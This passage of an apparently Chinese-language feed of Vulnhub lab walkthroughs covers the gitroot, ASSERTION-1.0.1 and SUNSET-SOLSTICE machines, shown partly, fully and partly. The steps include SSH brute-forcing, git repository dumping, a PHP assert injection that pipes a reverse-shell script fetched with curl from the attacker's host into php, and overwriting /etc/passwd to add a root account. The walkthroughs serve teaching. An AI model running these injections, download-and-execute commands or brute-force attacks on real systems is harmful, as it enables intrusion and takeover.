+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ sudo nmap -v -A -p- &lt;span style="color:#00688b">$rip&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>PORT STATE SERVICE VERSION
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| ssh-hostkey:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| &lt;span style="color:#b452cd">2048&lt;/span> bf:45:f6:b3:e3:ce:0c:69:18:5a:5b:27:e5:d3:9c:86 (RSA)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| &lt;span style="color:#b452cd">256&lt;/span> b5:d7:45:50:06:c4:e2:3c:28:52:b8:06:26:1f:de:b0 (ECDSA)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_ &lt;span style="color:#b452cd">256&lt;/span> 27:f0:d0:21:13:30:9c:5e:f0:70:a1:d8:5c:a7:8f:75 (ED25519)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>80/tcp open http Apache httpd 2.4.38 ((Debian))
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_http-generator: WordPress 5.0.4
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_http-title: myblog! &amp;amp;&lt;span style="color:#228b22">#8211; Just another WordPress site&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| http-methods:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_ Supported Methods: GET HEAD POST OPTIONS
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_http-server-header: Apache/2.4.38 (Debian)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>11211/tcp open memcache?
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| fingerprint-strings:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| RPCCheck:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_ Unknown &lt;span style="color:#658b00">command&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>11211端口 memcache服务 未发现有用信息&lt;/p>
+&lt;h3 id="web测试">WEB测试&lt;/h3>
+&lt;p>&lt;img src="https://www.vulnhub.cn/walkthrough/488/1.webp" alt="1">&lt;/p>
+&lt;p>编辑&lt;code>/etc/hosts&lt;/code> 添加&lt;/p>
+&lt;div class="highlight">&lt;div style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
+&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>10.0.2.37 wp.gitroot.vuln gitroot.vuln
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h4 id="wpgitrootvuln">wp.gitroot.vuln&lt;/h4>
+&lt;p>访问&lt;a href="http://wp.gitroot.vuln">http://wp.gitroot.vuln&lt;/a>&lt;/p>
+&lt;p>&lt;img src="https://www.vulnhub.cn/walkthrough/488/2.webp" alt="2">&lt;/p>
+&lt;h5 id="wpscan">wpscan&lt;/h5>
+&lt;div class="highlight">&lt;div style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
+&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ wpscan --url http://wp.gitroot.vuln --api-token ******************************************* -e
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>未发现有用信息&lt;/p>
+&lt;p>同时开着爆破&lt;/p>
+&lt;div class="highlight">&lt;div style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
+&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>wpscan --url http://wp.gitroot.vuln/ -U beth -P /usr/share/wordlists/rockyou.txt -t &lt;span style="color:#b452cd">10&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>后面有突破以后也没爆出来密码，就停掉了&lt;/p>
+&lt;h4 id="gobuster">gobuster&lt;/h4>
+&lt;p>只能看看是否有其他域名&lt;/p>
+&lt;div class="highlight">&lt;div style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
+&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>gobuster vhost -u gitroot.vuln -w /usr/share/dirb/wordlists/big.txt|grep &lt;span style="color:#b452cd">200&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>&lt;img src="https://www.vulnhub.cn/walkthrough/488/3.webp" alt="3">&lt;/p>
+&lt;p>编辑&lt;code>/etc/hosts&lt;/code> 添加 &lt;code>repo.gitroot.vuln&lt;/code>&lt;/p>
+&lt;h4 id="repogitrootvuln">repo.gitroot.vuln&lt;/h4>
+&lt;p>&lt;img src="https://www.vulnhub.cn/walkthrough/488/4.webp" alt="4">&lt;/p>
+&lt;p>分别访问&lt;code>get.php&lt;/code> 和&lt;code>set.php&lt;/code>无有用信息&lt;/p>
+&lt;h5 id="dirsearch">dirsearch&lt;/h5>
+&lt;p>&lt;img src="https://www.vulnhub.cn/walkthrough/488/5.webp" alt="5">&lt;/p>
+&lt;p>存在&lt;code>.git&lt;/code>信息泄露&lt;/p>
+&lt;h5 id="gittools">GitTools&lt;/h5>
+&lt;div class="highlight">&lt;div style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
+&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ git clone https://github.com/internetwache/GitTools
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ ./gitdumper.sh http://repo.gitroot.vuln/.git/ repo.gitroot.vuln
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ ./extractor.sh ../Dumper/repo.gitroot.vuln/ repo.gitroot.vuln
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>查看代码寻找有用信息&lt;/p>
+&lt;p>&lt;img src="https://www.vulnhub.cn/walkthrough/488/6.webp" alt="6">&lt;/p>
+&lt;p>找到用户名&lt;code>pablo&lt;/code> 密码&lt;code>ihjedpvqfe&lt;/code> 登录失败&lt;/p>
+&lt;h3 id="暴力破解">暴力破解&lt;/h3>
+&lt;p>爆破&lt;code>pablo&lt;/code>用户的ssh登录密码&lt;/p>
+&lt;div class="highlight">&lt;div style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
+&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ hydra -l pablo -P /usr/share/wordlists/rockyou.txt -f 10.0.2.37 ssh
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h2 id="获得权限">获得权限&lt;/h2>
+&lt;h3 id="pablo">pablo&lt;/h3>
+&lt;p>因为rockyou字典扩增，原本很快可以爆破的密码，现在会时间极长。参考其他报告，这里可获得密码&lt;code>mastergitar&lt;/code>&lt;/p>
+&lt;p>查看文件发现提示&lt;/p>
+&lt;p>&lt;img src="https://www.vulnhub.cn/walkthrough/488/7.webp" alt="7">&lt;/p>
+&lt;h3 id="beth">beth&lt;/h3>
+&lt;h4 id="思路一">思路一&lt;/h4>
+&lt;p>找到目录并开启web服务&lt;/p>
+&lt;p>&lt;img src="https://www.vulnhub.cn/walkthrough/488/8.webp" alt="8">&lt;/p>
+&lt;p>继续上GitTools&lt;/p>
+&lt;div class="highlight">&lt;div style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
+&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ ./gitdumper.sh http://10.0.2.37:9000/.git/ auth
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ ./extractor.sh ../Dumper/auth auth
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>到auth目录本地查找有用信息&lt;/p>
+&lt;p>&lt;img src="https://www.vulnhub.cn/walkthrough/488/9.webp" alt="9">&lt;/p>
+&lt;h4 id="思路二">思路二&lt;/h4>
+&lt;p>&lt;img src="https://www.vulnhub.cn/walkthrough/488/10.webp" alt="10">&lt;/p>
+&lt;p>&lt;img src="https://www.vulnhub.cn/walkthrough/488/11.webp" alt="11">&lt;/p>
+&lt;p>获得密码&lt;code>r3vpdmspqdb&lt;/code>&lt;/p>
+&lt;p>查看home目录，获得三个用户名&lt;code>beth jen pablo&lt;/code>，二选一测试，发现用户名&lt;code>beth&lt;/code>密码&lt;code>r3vpdmspqdb&lt;/code>&lt;/p>
+&lt;h3 id="jen">jen&lt;/h3>
+&lt;p>&lt;img src="https://www.vulnhub.cn/walkthrough/488/12.webp" alt="12">&lt;/p>
+&lt;p>查看目录权限&lt;/p>
+&lt;p>&lt;img src="https://www.vulnhub.cn/walkthrough/488/13.webp" alt="13">&lt;/p>
+&lt;p>参考&lt;a href="https://www.pentestpartners.com/security-blog/pwning-git-a-proof-of-concept-poc/">Pwning git: A Proof of Concept (PoC)&lt;/a>&lt;/p>
+&lt;p>&lt;img src="https://www.vulnhub.cn/walkthrough/488/14.webp" alt="14">&lt;/p>
+&lt;p>本地监听444端口，成功接收反弹shell&lt;/p>
+&lt;p>&lt;img src="https://www.vulnhub.cn/walkthrough/488/15.webp" alt="15">&lt;/p>
+&lt;p>&lt;img src="https://www.vulnhub.cn/walkthrough/488/16.webp" alt="16">&lt;/p>
+&lt;p>&lt;img src="https://www.vulnhub.cn/walkthrough/488/17.webp" alt="17">&lt;/p>
+&lt;h2 id="提权">提权&lt;/h2>
+&lt;p>上&lt;a href="https://gtfobins.github.io/gtfobins/git/">GTFOBins &lt;/a> 看看git&lt;/p>
+&lt;p>&lt;img src="https://www.vulnhub.cn/walkthrough/488/18.webp" alt="18">&lt;/p>
+&lt;p>&lt;img src="https://www.vulnhub.cn/walkthrough/488/19.webp" alt="19">&lt;/p>
+&lt;p>成功获得root权限&lt;/p>- https://www.vulnhub.cn/walkthrough/488/ - This is a customized copyright.</description></item><item><title>Vulnhub 495 ASSERTION-1.0.1</title><link>https://www.vulnhub.cn/walkthrough/495/</link><pubDate>Sun, 28 Jun 2020 00:00:00 +0000</pubDate><guid>https://www.vulnhub.cn/walkthrough/495/</guid><description>Vulnhub靶机教程 https://www.vulnhub.cn/walkthrough/495/ -&lt;p>考点：LFI,GTFOBins&lt;/p>
+&lt;p>靶机链接：&lt;a href="https://www.vulnhub.com/entry/assertion-101,495/">https://www.vulnhub.com/entry/assertion-101,495/&lt;/a>&lt;/p>
+&lt;h2 id="环境配置">环境配置&lt;/h2>
+&lt;table>
+&lt;thead>
+&lt;tr>
+&lt;th>名称&lt;/th>
+&lt;th>IP&lt;/th>
+&lt;/tr>
+&lt;/thead>
+&lt;tbody>
+&lt;tr>
+&lt;td>Kali Linux&lt;/td>
+&lt;td>192.168.88.128&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>ASSERTION-1.0.1&lt;/td>
+&lt;td>192.168.88.129&lt;/td>
+&lt;/tr>
+&lt;/tbody>
+&lt;/table>
+&lt;h2 id="初步打点">初步打点&lt;/h2>
+&lt;h3 id="端口扫描">端口扫描&lt;/h3>
+&lt;div class="highlight">&lt;div style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
+&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ &lt;span style="color:#658b00">export&lt;/span> &lt;span style="color:#00688b">rip&lt;/span>=192.168.88.129
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ sudo nmap -v -A -p- &lt;span style="color:#00688b">$rip&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>PORT STATE SERVICE VERSION
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| ssh-hostkey:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| &lt;span style="color:#b452cd">2048&lt;/span> 6e:ce:aa:cc:02:de:a5:a3:58:5d:da:2b:ef:54:07:f9 (RSA)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| &lt;span style="color:#b452cd">256&lt;/span> 9d:3f:df:16:7a:e1:59:58:84:4a:e3:29:8f:44:87:8d (ECDSA)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_ &lt;span style="color:#b452cd">256&lt;/span> 87:b5:6f:f8:21:81:d3:3b:43:d0:40:81:c0:e3:69:89 (ED25519)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>80/tcp open http Apache httpd 2.4.29 ((Ubuntu))
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_http-server-header: Apache/2.4.29 (Ubuntu)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| http-methods:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_ Supported Methods: GET HEAD POST OPTIONS
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_http-title: Assertion
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h3 id="web测试">WEB测试&lt;/h3>
+&lt;h4 id="端口80">端口80&lt;/h4>
+&lt;p>&lt;img src="https://www.vulnhub.cn/walkthrough/495/1.webp" alt="1">&lt;/p>
+&lt;p>&lt;img src="https://www.vulnhub.cn/walkthrough/495/2.webp" alt="2">&lt;/p>
+&lt;p>大概率存在LFI，数次尝试失败，&lt;a href="https://book.hacktricks.xyz/pentesting-web/file-inclusion#lfi-via-phps-assert">盲猜asset的LFI，参考&lt;/a>&lt;/p>
+&lt;div class="highlight">&lt;div style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
+&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>http://192.168.88.129/index.php?page=./blog&lt;span style="color:#cd5555">&amp;#39; and die(show_source(&amp;#39;&lt;/span>/etc/passwd&lt;span style="color:#cd5555">&amp;#39;)) or &amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>http://192.168.88.129/index.php?page=./blog&lt;span style="color:#cd5555">&amp;#39; and die(system(&amp;#39;&lt;/span>pwd&lt;span style="color:#cd5555">&amp;#39;)) or &amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>&lt;img src="https://www.vulnhub.cn/walkthrough/495/3.webp" alt="3">&lt;/p>
+&lt;p>&lt;img src="https://www.vulnhub.cn/walkthrough/495/4.webp" alt="4">&lt;/p>
+&lt;h2 id="获得权限">获得权限&lt;/h2>
+&lt;p>本地Kali 监听端口444&lt;/p>
+&lt;p>修改&lt;code>/usr/share/laudanum/php/php-reverse-shell.php&lt;/code>中的&lt;code>ip&lt;/code>和&lt;code>port&lt;/code>，使用&lt;code>python -m http.server 80&lt;/code>开启web服务&lt;/p>
+&lt;p>下载反弹shell脚本并执行&lt;/p>
+&lt;div class="highlight">&lt;div style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
+&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>http://192.168.88.129/index.php?page=./blog&lt;span style="color:#cd5555">&amp;#39; and die(system(&amp;#34;curl http://192.168.88.128/php-reverse-shell.php|php&amp;#34;)) or &amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>&lt;img src="https://www.vulnhub.cn/walkthrough/495/5.webp" alt="5">&lt;/p>
+&lt;p>成功接收反弹shell&lt;/p>
+&lt;h2 id="提权">提权&lt;/h2>
+&lt;p>运行linpeas.sh发现&lt;/p>
+&lt;p>&lt;img src="https://www.vulnhub.cn/walkthrough/495/6.webp" alt="6">&lt;/p>
+&lt;p>&lt;a href="https://gtfobins.github.io/gtfobins/aria2c/">上GTFOBins查询了一下&lt;/a>&lt;/p>
+&lt;p>可以aria2c覆盖&lt;code>/etc/passwd&lt;/code>文件&lt;/p>
+&lt;p>先查看&lt;code>$ cat /etc/passwd&lt;/code>内容，使用openssl生成密码hash，密码是&lt;code>password&lt;/code>&lt;/p>
+&lt;p>&lt;img src="https://www.vulnhub.cn/walkthrough/495/7.webp" alt="7">&lt;/p>
+&lt;p>再在本地web目录passwd文件中添加&lt;/p>
+&lt;div class="highlight">&lt;div style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
+&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>ii:&lt;span style="color:#00688b">$1$Pn&lt;/span>/iC2y8&lt;span style="color:#00688b">$HoH1HDv3n0uGse8fQUgvR&lt;/span>.:0:0:root:/root:/bin/bash
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>覆写靶机&lt;code>passwd&lt;/code>文件&lt;/p>
+&lt;div class="highlight">&lt;div style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
+&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ aria2c -o /etc/passwd &lt;span style="color:#cd5555">&amp;#34;http://192.168.88.128/passwd&amp;#34;&lt;/span> --allow-overwrite=&lt;span style="color:#658b00">true&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>写入后切换ii，密码输入&lt;code>password&lt;/code>&lt;/p>
+&lt;p>&lt;img src="https://www.vulnhub.cn/walkthrough/495/8.webp" alt="8">&lt;/p>- https://www.vulnhub.cn/walkthrough/495/ - This is a customized copyright.</description></item><item><title>Vulnhub 499 SUNSET-SOLSTICE</title><link>https://www.vulnhub.cn/walkthrough/499/</link><pubDate>Fri, 26 Jun 2020 00:00:00 +0000</pubDate><guid>https://www.vulnhub.cn/walkthrough/499/</guid><description>Vulnhub靶机教程 https://www.vulnhub.cn/walkthrough/499/ -&lt;p>考点：文件包含、权限继承&lt;/p>
+&lt;p>靶机链接：&lt;a href="https://www.vulnhub.com/entry/sunset-solstice,499/">https://www.vulnhub.com/entry/sunset-solstice,499/&lt;/a>&lt;/p>
+&lt;h2 id="环境配置">环境配置&lt;/h2>
+&lt;table>
+&lt;thead>
+&lt;tr>
+&lt;th>名称&lt;/th>
